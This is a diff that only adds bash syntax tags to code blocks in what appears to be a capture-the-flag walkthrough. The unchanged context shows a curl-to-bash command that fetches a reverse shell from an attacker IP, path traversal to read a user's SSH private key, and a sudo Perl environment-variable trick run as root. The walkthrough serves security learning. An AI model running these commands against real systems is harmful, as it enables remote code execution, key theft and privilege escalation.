@@ -131,7 +131,7 @@ Now let's go to that url and execute whatever command we want.
 
 So we will do this command:
 
-```
+```bash
 curl%20http://10.10.14.38/bashRev|bash
 ```
 
@@ -227,7 +227,7 @@ We can read files, and where is the location we are at? it's the user home direc
 
 So how about we try to get his private key?
 
-```
+```bash
 ./execute_query 5 ../.ssh/id_rsa
 ```
 
@@ -241,7 +241,7 @@ let's copy it locally and use it to log in....
 
 
 We put the key into a file and give it the following permissions:
-```
+```bash
 chmod 600 "key file"
 ```
 
@@ -251,7 +251,7 @@ Note: you need to fix the file because it  missing a - first line and last line,
 
 
 Then we will login:
-```
+```bash
 ssh -i "key file" jack@10.10.11.232
 ```
 
@@ -271,7 +271,7 @@ Link: https://www.elttam.com/blog/env/#content
 So we can use perl environment variables to execute commands, and since we can do it with sudo that means they will be as root.
 
 Let's try this id command as a test:
-```
+```bash
 sudo PERL5OPT=-d PERL5DB='system("id");' /opt/monitor.sh
 ```
 
